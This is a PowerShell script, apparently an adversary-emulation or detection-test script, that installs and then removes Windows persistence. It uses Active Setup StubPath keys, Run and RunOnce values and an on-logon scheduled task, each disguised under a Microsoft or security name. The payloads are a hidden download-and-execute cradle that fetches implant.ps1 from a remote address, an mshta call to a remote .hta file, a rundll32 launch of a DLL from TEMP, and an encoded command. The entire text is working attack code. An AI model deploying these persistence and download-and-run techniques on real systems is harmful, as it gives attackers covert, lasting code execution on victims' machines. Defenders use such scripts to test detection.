$guid = "{$(([guid]::NewGuid()).ToString())}"
$payload = "cmd.exe /c powershell.exe -ep bypass -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.1/implant.ps1')`""

$asKeyHKCU = "HKCU:\Software\Microsoft\Active Setup\Installed Components\$guid"
New-Item -Path $asKeyHKCU -Force | Out-Null
New-ItemProperty -Path $asKeyHKCU -Name "(Default)" -Value "Windows Security Update" -Force | Out-Null
New-ItemProperty -Path $asKeyHKCU -Name "StubPath" -Value $payload -PropertyType String -Force | Out-Null
New-ItemProperty -Path $asKeyHKCU -Name "Version" -Value "1,0,0,0" -PropertyType String -Force | Out-Null

$asKeyHKLM = "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\$guid"
try {
    New-Item -Path $asKeyHKLM -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $asKeyHKLM -Name "(Default)" -Value "Windows Security Update" -Force | Out-Null
    New-ItemProperty -Path $asKeyHKLM -Name "StubPath" -Value $payload -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $asKeyHKLM -Name "Version" -Value "1,0,0,0" -PropertyType String -Force | Out-Null
} catch {}

$guid2 = "{$(([guid]::NewGuid()).ToString())}"
$payload2 = "rundll32.exe $env:TEMP\update.dll,DllMain"
$asKey2 = "HKCU:\Software\Microsoft\Active Setup\Installed Components\$guid2"
New-Item -Path $asKey2 -Force | Out-Null
New-ItemProperty -Path $asKey2 -Name "(Default)" -Value "Microsoft Edge Updater" -Force | Out-Null
New-ItemProperty -Path $asKey2 -Name "StubPath" -Value $payload2 -PropertyType String -Force | Out-Null

$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $runKey -Name "WindowsSecurityHealth" -Value $payload -PropertyType String -Force | Out-Null
New-ItemProperty -Path $runKey -Name "OneDriveSync" -Value "powershell.exe -ep bypass -w hidden -enc $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami')))" -PropertyType String -Force | Out-Null

$runOnce = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
New-ItemProperty -Path $runOnce -Name "SecurityUpdate" -Value "mshta.exe http://198.51.100.1/payload.hta" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null

& schtasks.exe /create /tn "MicrosoftEdgeUpdateCore" /tr $payload /sc onlogon /f 2>&1 | Out-Null
& schtasks.exe /delete /tn "MicrosoftEdgeUpdateCore" /f 2>&1 | Out-Null

Remove-Item $asKeyHKCU -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $asKeyHKLM -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $asKey2 -Recurse -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $runKey -Name "WindowsSecurityHealth" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $runKey -Name "OneDriveSync" -Force -ErrorAction SilentlyContinue
Remove-ItemProperty -Path $runOnce -Name "SecurityUpdate" -Force -ErrorAction SilentlyContinue
